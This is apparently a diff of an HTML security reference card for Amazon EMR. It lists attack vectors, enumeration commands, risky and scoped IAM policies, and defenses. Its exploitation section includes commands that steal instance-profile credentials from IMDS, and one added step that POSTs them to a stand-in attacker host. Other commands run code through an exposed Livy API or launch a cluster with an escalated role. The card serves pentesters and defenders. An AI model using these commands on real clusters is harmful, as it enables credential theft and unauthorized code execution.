@@ -263,7 +263,7 @@
         <span class="header-title">Amazon EMR Security</span>
         <span class="header-badge">ANALYTICS</span>
       </div>
-      <p class="header-desc">Amazon EMR runs Apache Spark, Hadoop, Hive, Presto, and other big data frameworks on EC2 clusters. Cluster nodes expose numerous web UIs, run with EC2 instance profiles granting S3 access via EMRFS, and execute arbitrary code. IMDS credential theft, exposed web interfaces, and over-privileged instance profiles are the primary attack surface.</p>
+      <p class="header-desc">Amazon EMR (Elastic MapReduce) runs Apache Spark, Hadoop, Hive, Presto, and other big data frameworks on EC2 clusters. Cluster nodes expose numerous web UIs (YARN on 8088, Spark History Server on 18080, Livy on 8998, Hue on 8888, JupyterHub on 9443), run with EC2 instance profiles granting S3 access via EMRFS, and execute arbitrary code through steps and bootstrap actions. IMDS credential theft, exposed web interfaces, and over-privileged instance profiles are the primary attack surface.</p>
     </div>
   </div>
 </div>
@@ -288,19 +288,19 @@
         </div></div>
 
 <!-- Overview -->
-<div class="section"><h2><span style="color:#f97316;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+<div class="section"><h2><span style="color:#f97316;">📋</span> Service Overview</h2><div class="overview-grid">
         <div>
           <h4 style="color: #f97316;">Cluster Nodes and IMDS</h4>
-          <p>EMR cluster nodes are EC2 instances with an instance profile (default: EMR_EC2_DefaultRole) granting S3 access. Each node exposes IMDS at 169.254.169.254. IMDSv1 is vulnerable to SSRF-based credential theft.</p>
-          <div class="attack-note"><span style="color:#f97316;">Attack note:</span> Any code running on an EMR cluster node can query IMDS to obtain the EC2 instance profile credentials, which typically include broad S3 access.</div>
-        </div>
-        <div>
+          <p>EMR cluster nodes are EC2 instances with an instance profile (default: <code>EMR_EC2_DefaultRole</code>) that grants S3 access through EMRFS. Each node exposes the EC2 Instance Metadata Service at 169.254.169.254. IMDSv1 is vulnerable to SSRF-based credential theft from any application running on the cluster (Spark jobs, Jupyter notebooks, Livy endpoints).</p>
+          <div class="attack-note"><span style="color:#f97316;">Attack note:</span> Any code running on an EMR cluster node can query IMDS to obtain the EC2 instance profile credentials, which typically include broad S3 access</div>
+        </div><div>
           <h4 style="color: #f97316;">Web Interfaces and Exposed Ports</h4>
-          <p>EMR clusters host over a dozen web interfaces: YARN ResourceManager (8088), Spark History Server (18080), Livy REST API (8998), Hue (8888), JupyterHub (9443), Zeppelin (8890), and more.</p>
-          <div class="attack-note"><span style="color:#f97316;">Attack note:</span> Livy (port 8998) accepts unauthenticated REST API calls to execute arbitrary code on the cluster if exposed to the network.</div>
+          <p>EMR clusters host over a dozen web interfaces on the primary node: YARN ResourceManager (8088), Spark History Server (18080), Livy REST API (8998), Hue (8888), JupyterHub (9443), Zeppelin (8890), Ganglia (80), Tez UI (8080), HBase (16010), Flink History Server (8082), and HDFS NameNode (9870 on EMR 6.x, 50070 on pre-6.x). These are meant to be accessed only via SSH tunnel.</p>
+          <div class="attack-note"><span style="color:#f97316;">Attack note:</span> Livy (port 8998) accepts unauthenticated REST API calls to execute arbitrary code on the cluster if exposed to the network</div>
         </div></div></div>
 
 <!-- Risk Assessment -->
+
 <div class="section">
   <h2>Security Risk Assessment</h2>
   <div class="risk-gauge">
@@ -315,161 +315,264 @@
       <div class="risk-score-label">Risk Score</div>
     </div>
   </div>
-  <p class="risk-desc">EMR clusters run arbitrary code by design, combine multiple EC2 instances with shared credentials, expose numerous unauthenticated web interfaces, and often have instance profiles with broad S3 access. Without encryption, data at rest and in transit is unprotected.</p>
+  <p class="risk-desc">EMR clusters run arbitrary code by design, combine multiple EC2 instances with shared credentials, expose numerous unauthenticated web interfaces, and often have instance profiles with broad S3 access. Without encryption enabled via security configurations, data at rest and in transit is unprotected by default.</p>
 </div>
 
 <!-- Main Panels -->
 <div class="panels-grid">
       <div class="panel" style="border-color: #f8717133;">
-        <h3 style="color: #f87171;">&#x2694;&#xFE0F; Attack Vectors</h3><h4 style="color: #f87171;">Credential Theft and SSRF</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> SSRF to IMDS (169.254.169.254) for instance profile creds</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Livy REST API (8998) unauthenticated remote code execution</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Jupyter/Zeppelin notebooks exfiltrating IMDS credentials</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> YARN ResourceManager (8088) application submission for RCE</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> EMRFS credentials provide access to S3 data lakes</li></ul><h4 style="color: #f87171;">Step and Bootstrap Injection</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> AddJobFlowSteps to inject arbitrary code execution</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Bootstrap actions execute as root on every node</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Over-privileged EMR service role abuse</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Malicious S3 objects replacing bootstrap scripts</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Custom JAR steps run with full instance profile permissions</li></ul></div>
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Credential Theft and SSRF</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> SSRF from cluster applications to IMDS (169.254.169.254) to steal instance profile credentials</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Livy REST API (port 8998) allows unauthenticated remote code execution if network-exposed</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Jupyter/Zeppelin notebooks executing code that exfiltrates IMDS credentials</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> YARN ResourceManager (port 8088) application submission to execute arbitrary code</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> EMRFS credentials provide access to S3 data lakes, potentially across multiple buckets</li></ul><h4 style="color: #f87171;">Step and Bootstrap Injection</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> <code>elasticmapreduce:AddJobFlowSteps</code> permission allows injecting arbitrary code execution steps into running clusters</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Bootstrap actions execute as root on every node at cluster launch with no runtime guardrails</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Over-privileged EMR service role (<code>EMR_DefaultRole</code>) can be abused for cluster manipulation</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Malicious S3 objects replacing legitimate bootstrap scripts or step JARs</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Custom JAR steps run with full instance profile permissions on the cluster</li></ul></div>
       <div class="panel" style="border-color: #fb923c33;">
-        <h3 style="color: #fb923c;">&#x26A0;&#xFE0F; Misconfigurations</h3><h4 style="color: #fb923c;">Network and Access</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Security groups open to 0.0.0.0/0 on UI ports (8088, 8998)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> EMR block public access disabled</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Primary node with public IP in public subnet</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No SSH tunnel or Knox gateway for web interfaces</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Kerberos authentication not configured</li></ul><h4 style="color: #fb923c;">Data Protection</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No security configuration attached (no encryption)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> EBS volumes and local storage not encrypted</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> EMRFS data in S3 not encrypted</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> In-transit encryption (TLS) not enabled</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Instance profile with s3:* on * (overly broad)</li></ul></div>
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Network and Access</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Security groups allowing inbound access to web UI ports (8088, 18080, 8998, 8888) from 0.0.0.0/0</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> EMR block public access disabled for the account</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Primary node with public IP address in a public subnet</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No SSH tunnel or Apache Knox gateway for web interface access</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Kerberos authentication not configured (no user-level authentication on the cluster)</li></ul><h4 style="color: #fb923c;">Data Protection</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Security configuration not attached to the cluster (no encryption at rest or in transit)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> EBS volumes and local instance storage not encrypted with LUKS or EBS encryption</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> EMRFS data in S3 not encrypted (SSE-S3, SSE-KMS, or CSE-KMS not configured)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> In-transit encryption (TLS) not enabled for Spark shuffle, HDFS transfers, and Presto internal communication</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Instance profile with overly broad S3 permissions (e.g., <code>s3:*</code> on <code>*</code>) instead of scoped EMRFS IAM roles</li></ul></div>
       <div class="panel" style="border-color: #22d3ee33;">
-        <h3 style="color: #22d3ee;">&#x1F50D; Enumeration</h3><div class="cmd-block">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3><div class="cmd-block">
           <div class="cmd-title">List All Clusters</div>
           <pre><code>aws emr list-clusters --active</code></pre>
         </div><div class="cmd-block">
-          <div class="cmd-title">Describe a Cluster</div>
+          <div class="cmd-title">Describe a Cluster (security config, roles, instance profile)</div>
           <pre><code>aws emr describe-cluster --cluster-id j-XXXXXXXXXXXXX</code></pre>
         </div><div class="cmd-block">
           <div class="cmd-title">List Security Configurations</div>
           <pre><code>aws emr list-security-configurations</code></pre>
         </div><div class="cmd-block">
+          <div class="cmd-title">Describe a Security Configuration (encryption settings)</div>
+          <pre><code>aws emr describe-security-configuration \
+  --name my-security-config</code></pre>
+        </div><div class="cmd-block">
           <div class="cmd-title">List Steps on a Cluster</div>
           <pre><code>aws emr list-steps --cluster-id j-XXXXXXXXXXXXX</code></pre>
         </div><div class="cmd-block">
-          <div class="cmd-title">Get Block Public Access Config</div>
+          <div class="cmd-title">List Bootstrap Actions on a Cluster</div>
+          <pre><code>aws emr describe-cluster --cluster-id j-XXXXXXXXXXXXX \
+  --query 'Cluster.BootstrapActions'</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">List Instances in a Cluster</div>
+          <pre><code>aws emr list-instances --cluster-id j-XXXXXXXXXXXXX</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Get Block Public Access Configuration</div>
           <pre><code>aws emr get-block-public-access-configuration</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Get Cluster Session Credentials</div>
+          <pre><code>aws emr get-cluster-session-credentials \
+  --cluster-id j-XXXXXXXXXXXXX \
+  --execution-role-arn arn:aws:iam::123456789012:role/MyExecRole</code></pre>
         </div></div>
       <div class="panel" style="border-color: #c084fc33;">
-        <h3 style="color: #c084fc;">&#x1F4C8; Privilege Escalation</h3><h4 style="color: #c084fc;">From Cluster to AWS Account</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Instance profile credentials accessible via IMDS</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> EMR_EC2_DefaultRole has broad S3 access</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> AddJobFlowSteps injects arbitrary commands on nodes</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> RunJobFlow + iam:PassRole launches cluster with any role</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Livy REST API provides unauthenticated code execution</li></ul><div class="note"><strong>Key insight:</strong> EMR clusters execute arbitrary code by design. The real privilege escalation risk is the gap between &quot;can submit code to cluster&quot; and &quot;the permissions the instance profile grants in AWS.&quot;</div></div>
-      <div class="panel" style="border-color: #facc1533;">
-        <h3 style="color: #facc15;">&#x1F517; Persistence</h3><h4 style="color: #facc15;">Cluster-Level</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Submit persistent steps that run on cluster lifecycle events</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify bootstrap actions for future cluster launches</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Replace S3-stored bootstrap scripts or JAR files</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Add cron jobs on cluster nodes for persistent access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create additional clusters with escalated roles</li></ul><h4 style="color: #facc15;">Data-Level</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Exfiltrate IMDS credentials for out-of-band access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Establish reverse shells from cluster nodes</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Maintain access to S3 data lake via stolen credentials</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create new EMR notebooks for ongoing code execution</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify security groups to maintain network access</li></ul></div>
-      <div class="panel" style="border-color: #4ade8033;">
-        <h3 style="color: #4ade80;">&#x1F6E1;&#xFE0F; Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> RunJobFlow - new cluster launched</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> AddJobFlowSteps - steps added to cluster</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateSecurityConfiguration - security config created</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> PutBlockPublicAccessConfiguration - BPA changed</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> GetClusterSessionCredentials - session creds requested</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Steps submitted from unusual principals</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Clusters launched without security configurations</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> IMDS credential usage from unexpected IPs</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Livy API calls from non-cluster sources</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Security group modifications on EMR clusters</li></ul></div></div>
+        <h3 style="color: #c084fc;">📈 Privilege Escalation</h3><h4 style="color: #c084fc;">From Cluster Code Execution to AWS Account</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Any code running on a cluster node (Spark job, Hive query, bootstrap action) inherits the EC2 instance profile credentials</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Default <code>EMR_EC2_DefaultRole</code> historically included broad S3 access; stolen credentials can access the entire data lake</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> <code>elasticmapreduce:AddJobFlowSteps</code> allows injecting steps that run arbitrary commands on cluster nodes</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> <code>elasticmapreduce:RunJobFlow</code> with <code>iam:PassRole</code> allows launching a new cluster with any passable role, escalating to that role's permissions</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Livy REST API allows unauthenticated code execution on the cluster if port 8998 is reachable, leading to credential theft via IMDS</li></ul><div class="note"><strong>Key insight:</strong> EMR clusters execute arbitrary code by design. The real privilege escalation risk is the gap between &quot;can submit code to the cluster&quot; and &quot;the permissions the cluster's instance profile grants in AWS.&quot;</div></div></div>
 
 <!-- Exploitation -->
-<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid"><div class="cmd-block">
-          <div class="cmd-title">Steal IMDS Credentials from Cluster Node</div>
+<div class="section"><h2><span style="color:#f87171;">💻</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Steal Instance Profile Credentials from a Cluster Node</div>
           <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 # Returns role name, then:
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt;</code></pre>
         </div><div class="cmd-block">
-          <div class="cmd-title">Submit Malicious Step to Running Cluster</div>
+          <div class="cmd-title">Submit a Malicious Step to a Running Cluster</div>
           <pre><code>aws emr add-steps --cluster-id j-XXXXXXXXXXXXX \
-  --steps Type=CUSTOM_JAR,Name=Exfil,Jar=command-runner.jar,Args=[bash,-c,&quot;curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ &gt; /tmp/creds&quot;]</code></pre>
+  --steps Type=CUSTOM_JAR,Name=Exfil,Jar=command-runner.jar,Args=[bash,-c,&quot;curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ &gt; /tmp/creds &amp;&amp; curl -X POST -d @/tmp/creds https://attacker.example.com/collect&quot;]</code></pre>
         </div><div class="cmd-block">
-          <div class="cmd-title">Execute Code via Livy REST API</div>
+          <div class="cmd-title">Execute Code via Livy REST API (if port 8998 is exposed)</div>
           <pre><code>curl -X POST -H &quot;Content-Type: application/json&quot; \
   http://&lt;emr-primary-node&gt;:8998/batches \
-  -d '{"file": "s3://attacker-bucket/malicious.py"}'</code></pre>
+  -d '{&quot;file&quot;: &quot;s3://attacker-bucket/malicious.py&quot;}'</code></pre>
         </div><div class="cmd-block">
-          <div class="cmd-title">Launch Cluster with Escalated Role</div>
+          <div class="cmd-title">Launch a Cluster with an Escalated Role</div>
           <pre><code>aws emr create-cluster --name &quot;escalation&quot; \
   --release-label emr-6.15.0 \
   --instance-type m5.xlarge --instance-count 1 \
-  --ec2-attributes InstanceProfile=HighPrivilegeRole</code></pre>
+  --ec2-attributes InstanceProfile=HighPrivilegeRole \
+  --service-role EMR_DefaultRole \
+  --steps Type=CUSTOM_JAR,Name=&quot;cmd&quot;,Jar=&quot;command-runner.jar&quot;,Args=[&quot;aws&quot;,&quot;s3&quot;,&quot;ls&quot;]</code></pre>
         </div></div></div>
 
 <!-- Policies -->
-<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid"><div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+<div class="section"><h2><span style="color:#4ade80;">📜</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
           <div class="policy-header">
             <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
             <span style="color: #f87171; font-weight: 600;">Dangerous - Overly Broad Step Submission</span>
           </div>
           <pre><code>{
-  &quot;Effect&quot;: &quot;Allow&quot;,
-  &quot;Action&quot;: [
-    &quot;elasticmapreduce:AddJobFlowSteps&quot;,
-    &quot;elasticmapreduce:RunJobFlow&quot;
-  ],
-  &quot;Resource&quot;: &quot;*&quot;
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;elasticmapreduce:AddJobFlowSteps&quot;,
+      &quot;elasticmapreduce:RunJobFlow&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
 }</code></pre>
           <p class="policy-desc">Allows injecting arbitrary code steps into any EMR cluster or launching new clusters</p>
         </div><div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
           <div class="policy-header">
             <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
-            <span style="color: #4ade80; font-weight: 600;">Secure - Scoped Read-Only Cluster Access</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Scoped Cluster Access</span>
           </div>
           <pre><code>{
-  &quot;Effect&quot;: &quot;Allow&quot;,
-  &quot;Action&quot;: [
-    &quot;elasticmapreduce:DescribeCluster&quot;,
-    &quot;elasticmapreduce:ListSteps&quot;,
-    &quot;elasticmapreduce:ListInstances&quot;
-  ],
-  &quot;Resource&quot;: &quot;arn:aws:elasticmapreduce:*:*:cluster/*&quot;
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;elasticmapreduce:DescribeCluster&quot;,
+      &quot;elasticmapreduce:ListSteps&quot;,
+      &quot;elasticmapreduce:ListInstances&quot;
+    ],
+    &quot;Resource&quot;: &quot;arn:aws:elasticmapreduce:eu-west-1:123456789012:cluster/*&quot;,
+    &quot;Condition&quot;: {
+      &quot;StringEquals&quot;: {
+        &quot;aws:ResourceTag/Environment&quot;: &quot;production&quot;
+      }
+    }
+  }]
 }</code></pre>
-          <p class="policy-desc">Read-only access scoped to cluster monitoring</p>
+          <p class="policy-desc">Read-only access scoped to tagged clusters in a specific region</p>
         </div><div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
           <div class="policy-header">
             <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
-            <span style="color: #f87171; font-weight: 600;">Dangerous - Full S3 Access on Instance Profile</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Instance Profile with Full S3 Access</span>
           </div>
           <pre><code>{
-  &quot;Effect&quot;: &quot;Allow&quot;,
-  &quot;Action&quot;: &quot;s3:*&quot;,
-  &quot;Resource&quot;: &quot;*&quot;
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;s3:*&quot;,
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
 }</code></pre>
           <p class="policy-desc">Any code on the cluster can read/write/delete any S3 object in the account</p>
+        </div><div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Scoped EMRFS S3 Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;s3:GetObject&quot;,
+      &quot;s3:ListBucket&quot;
+    ],
+    &quot;Resource&quot;: [
+      &quot;arn:aws:s3:::my-data-lake-bucket&quot;,
+      &quot;arn:aws:s3:::my-data-lake-bucket/approved-prefix/*&quot;
+    ]
+  }]
+}</code></pre>
+          <p class="policy-desc">Instance profile limited to read-only access on specific S3 prefixes</p>
         </div></div></div>
 
 <!-- Defenses -->
-<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid"><div class="defense-card">
+<div class="section"><h2><span style="color:#4ade80;">🛡️</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F512;</span>
+            <span class="defense-icon"></span>
             <div>
               <h4>Enforce IMDSv2 on All Cluster Nodes</h4>
-              <p>Require IMDSv2 session tokens to block SSRF-based credential theft. Use EC2 launch templates with HttpTokens: required.</p>
+              <p>Require IMDSv2 session tokens to block SSRF-based credential theft from cluster applications.</p>
+              <pre><code>aws emr create-cluster --name &quot;secure-cluster&quot; \
+  --release-label emr-6.15.0 \
+  --instance-type m5.xlarge --instance-count 3 \
+  --ec2-attributes InstanceProfile=EMR_EC2_DefaultRole
+# Note: IMDSv2 enforcement requires an EC2 launch template with
+# MetadataOptions: {HttpTokens: required, HttpPutResponseHopLimit: 1}
+# referenced via --instance-groups with LaunchTemplate configuration.
+# The --ec2-attributes parameter does not support HttpTokens.</code></pre>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F510;</span>
+            <span class="defense-icon"></span>
             <div>
               <h4>Enable Encryption at Rest and in Transit</h4>
-              <p>Create a security configuration with SSE-KMS for S3, LUKS for local disk, and TLS for in-transit.</p>
+              <p>Create a security configuration that enables encryption for S3 data (SSE-KMS), local disk (LUKS), and in-transit (TLS).</p>
+              <pre><code>aws emr create-security-configuration \
+  --name &quot;encryption-config&quot; \
+  --security-configuration '{
+    &quot;EncryptionConfiguration&quot;: {
+      &quot;EnableInTransitEncryption&quot;: true,
+      &quot;InTransitEncryptionConfiguration&quot;: {
+        &quot;TLSCertificateConfiguration&quot;: {
+          &quot;CertificateProviderType&quot;: &quot;PEM&quot;,
+          &quot;S3Object&quot;: &quot;s3://my-certs-bucket/certs.zip&quot;
+        }
+      },
+      &quot;EnableAtRestEncryption&quot;: true,
+      &quot;AtRestEncryptionConfiguration&quot;: {
+        &quot;S3EncryptionConfiguration&quot;: {
+          &quot;EncryptionMode&quot;: &quot;SSE-KMS&quot;,
+          &quot;AwsKmsKey&quot;: &quot;arn:aws:kms:eu-west-1:123456789012:key/my-key-id&quot;
+        },
+        &quot;LocalDiskEncryptionConfiguration&quot;: {
+          &quot;EncryptionKeyProviderType&quot;: &quot;AwsKms&quot;,
+          &quot;AwsKmsKey&quot;: &quot;arn:aws:kms:eu-west-1:123456789012:key/my-key-id&quot;
+        }
+      }
+    }
+  }'</code></pre>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F6E1;&#xFE0F;</span>
+            <span class="defense-icon"></span>
             <div>
               <h4>Keep Block Public Access Enabled</h4>
-              <p>Prevents launching clusters with security groups allowing public inbound traffic except SSH (22).</p>
+              <p>Verify BPA is enabled (it is by default). This prevents launching clusters with security groups that allow public inbound traffic on any port except SSH (22).</p>
               <pre><code>aws emr get-block-public-access-configuration</code></pre>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F310;</span>
+            <span class="defense-icon"></span>
             <div>
               <h4>Launch Clusters in Private Subnets</h4>
-              <p>Place EMR clusters in private subnets with no public IPs. Use SSH tunnels or ALB with auth for web UI access.</p>
+              <p>Place EMR clusters in private subnets with no public IP addresses. Use SSH tunnels, VPN, or an Application Load Balancer with authentication for web UI access.</p>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F511;</span>
+            <span class="defense-icon"></span>
             <div>
               <h4>Enable Kerberos Authentication</h4>
-              <p>Configure Kerberos for user-level authentication before accessing HDFS, Hive, Spark.</p>
+              <p>Configure Kerberos for user-level authentication so that individual users are authenticated before accessing cluster services (HDFS, Hive, Spark).</p>
+              <pre><code>aws emr create-cluster --name &quot;kerberized-cluster&quot; \
+  --release-label emr-6.15.0 \
+  --instance-type m5.xlarge --instance-count 3 \
+  --security-configuration &quot;encryption-config&quot; \
+  --kerberos-attributes Realm=EXAMPLE.COM,KdcAdminPassword=&lt;password&gt;</code></pre>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F4C1;</span>
+            <span class="defense-icon"></span>
             <div>
-              <h4>Scope Instance Profile to Minimum S3 Paths</h4>
-              <p>Replace EMR_EC2_DefaultRole with a custom role granting only specific S3 buckets and prefixes.</p>
+              <h4>Use EMRFS IAM Roles for Fine-Grained S3 Access</h4>
+              <p>Instead of a single broad instance profile, configure EMRFS IAM role mappings in a security configuration so that different users or groups assume different roles when accessing S3 through EMRFS.</p>
+            </div>
+          </div>
+        </div><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon"></span>
+            <div>
+              <h4>Restrict Web Interface Access with Apache Knox</h4>
+              <p>Deploy Apache Knox as a perimeter gateway to authenticate and proxy web interface traffic instead of directly exposing YARN, Spark UI, Livy, and other endpoints.</p>
+            </div>
+          </div>
+        </div><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon"></span>
+            <div>
+              <h4>Scope Instance Profile to Minimum Required S3 Paths</h4>
+              <p>Replace the default <code>EMR_EC2_DefaultRole</code> with a custom role that grants access only to the specific S3 buckets and prefixes the cluster needs.</p>
             </div>
           </div>
         </div></div></div>
 
-<!-- Footer -->
 <div class="footer">
-  <p>Amazon EMR Security Security Card</p>
-  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+  <p><strong>Amazon EMR Security Card</strong></p>
+  <p>Always obtain proper authorization before testing</p>
 </div>
 
 </body>
